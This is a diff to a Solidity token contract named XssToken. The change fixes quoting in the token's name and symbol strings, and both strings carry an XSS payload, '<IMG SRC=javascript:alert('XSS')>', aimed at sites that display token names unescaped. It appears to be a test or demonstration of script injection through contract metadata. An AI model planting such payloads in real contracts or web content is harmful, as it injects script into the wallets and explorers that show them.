@@ -53,9 +53,9 @@ contract XssToken is EIP20Interface {
     
     mapping (address => mapping (address => uint256)) public allowed;
     
-    string public name = &quot;&gt;Love<IMG SRC=javascript:alert(&#39;XSS&#39;)>&quot;;
+    string public name = "&gt;Love<IMG SRC=javascript:alert(&#39;XSS&#39;)>";
     uint8 public decimals = 0;
-    string public symbol = &quot;LOVE<IMG SRC=javascript:alert(&#39;XSS&#39;)>&quot;;
+    string public symbol = "LOVE<IMG SRC=javascript:alert(&#39;XSS&#39;)>";
 
     constructor() public {
         totalSupply = MAX_UINT256;
